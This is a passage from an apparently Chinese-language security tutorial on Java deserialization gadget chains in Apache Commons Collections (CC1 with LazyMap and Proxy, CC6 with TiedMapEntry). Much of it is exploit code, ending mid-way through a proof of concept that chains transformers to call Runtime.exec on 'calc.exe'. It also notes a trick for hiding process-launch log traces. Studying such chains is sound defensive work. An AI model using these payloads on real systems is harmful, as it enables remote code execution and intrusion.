&lt;p>回看&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>，如果我们把这个对象用Proxy进行代理，那么readObject时只要调用任意方法 就会进入&lt;code>AnnotationInvocationHandler#invoke&lt;/code>触发get&lt;/p>
&lt;h4 id="构造">构造&lt;/h4>
&lt;p>先是用LazyMap替换TransformedMap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后对sun.reflect.annotation.AnnotationInvocationHandler进行Proxy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>代理后的对象是proxyMap，但是不能直接对其序列化 我们的入口点是&lt;code>sun.reflect.annotation.AnnotationInvocationHandler#readObject&lt;/code>，还要再用AnnotationInvocationHandler对这个proxyMap包裹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到ysoserial的末尾有new ConstantTransformer(1)，可以隐藏启动进程的日志特征&lt;/p>
&lt;p>————注意：LazyMap的CC1同样无法解决8u71后的使用问题，尽管它的漏洞触发在get和invoke，和setValue无关&lt;/p>
&lt;h2 id="cc6">CC6&lt;/h2>
&lt;p>上面提到CC1由于&lt;code>sun.reflect.annotation.AnnotationInvocationHandler#readObject&lt;/code>在8u71后的逻辑变化导致失效，这里来看一条解决高版本Java利用的CC6（代码部分来自p牛&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> -&amp;gt; Gadget chain:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.io.ObjectInputStream.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.util.HashMap.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.util.HashMap.hash()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> org.apache.commons.collections.map.LazyMap.get()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.functors.ChainedTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.functors.InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.lang.reflect.Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.lang.Runtime.exec()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>CC6解决CC1的方案是在上下文中寻找其它可以调用&lt;code>LazyMap.get&lt;/code>的地方，用到的是&lt;code>org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map.Entry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.KeyValue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TiedMapEntry&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">KeyValue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">serialVersionUID&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8453869361373831205L&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">^&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ..
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在它的&lt;code>getValue&lt;/code>中调用了&lt;code>this.map.get&lt;/code>，而hashCode方法调用了getValue（HashMap的实现原理），在ysoserial中是利用&lt;code>java.util.HashSet#readObject&lt;/code>到&lt;code>HashMap#put()&lt;/code>到&lt;code>HashMap#hash(key)&lt;/code>最后到&lt;code>TiedMapEntry#hashCode()&lt;/code>&lt;/p>
&lt;p>在p牛的简化poc中省略了前两步，通过&lt;code>HashMap#readObject&lt;/code>直接到&lt;code>HashMap#hash(key)&lt;/code>，hash中调用了&lt;code>key.hashCode&lt;/code>（纯HashMap的实现原理&lt;/p>
&lt;p>构造poc，我们只需要让这个key等于TiedMapEntry对象，再改动亿点点&lt;/p>
&lt;p>首先是恶意LazyMap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span> &lt;span style="color:#75715e">// 避免生成payload时触发RCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
